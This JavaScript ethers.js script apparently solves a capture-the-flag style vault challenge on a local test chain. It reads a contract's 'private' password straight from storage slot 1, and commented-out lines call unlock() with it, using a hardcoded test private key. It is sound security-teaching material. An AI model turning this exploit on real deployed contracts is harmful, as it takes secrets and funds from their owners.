const { ethers } = require("ethers");

async function main() {
    // Setup provider and attacker wallet (optional if calling unlock)
    const provider = new ethers.JsonRpcProvider("http://localhost:8545");
    const wallet = new ethers.Wallet("0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80", provider); // optional
    const contractAddress = "0x24B3c7704709ed1491473F30393FFc93cFB0FC34"; // 🔍 replace with real address

    // Load ABI (only need unlock() if you want to call it)
    const abi = [
        "function unlock(bytes32 _password) public",
        "function locked() public view returns (bool)"
    ];
    const contract = new ethers.Contract(contractAddress, abi, wallet);

    // Read storage slot 1 to get the private `password`
    const password = await provider.getStorage(contractAddress, 1);
    console.log("🔓 Leaked password:", password);

    // (Optional) Call unlock() with leaked password
    // const tx = await contract.unlock(password);
    // await tx.wait();
    // console.log("✅ Unlock transaction sent!");

    // Check lock status
    // const locked = await contract.locked();
    // console.log("🔐 Vault locked?", locked);
}

main();
